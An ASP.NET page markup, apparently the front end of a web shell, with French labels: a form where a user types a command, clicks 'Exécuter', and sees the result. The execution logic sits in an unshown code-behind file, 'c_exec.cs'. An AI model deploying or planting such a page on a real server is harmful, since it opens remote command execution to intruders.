<%@ Page Language="C#" AutoEventWireup="true" CodeFile="c_exec.cs" Inherits="ExecuterCommande" %>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Exécuter une Commande</title>
</head>
<body>
    <form id="form1" runat="server">
        <div>
            <asp:Panel ID="CommandePanel" runat="server" Visible="false">
                <h2>Entrez la commande à exécuter :</h2>
                <asp:TextBox ID="CommandeTextBox" runat="server"></asp:TextBox>
                <asp:Button ID="Executer" runat="server" Text="Exécuter" OnClick="Executer_Click" />
            </asp:Panel>

            <asp:Panel ID="ResultatPanel" runat="server" Visible="false">
                <h2>Résultat :</h2>
                <pre><asp:Label ID="ResultatLabel" runat="server"></asp:Label></pre>
            </asp:Panel>
        </div>
    </form>
</body>
</html>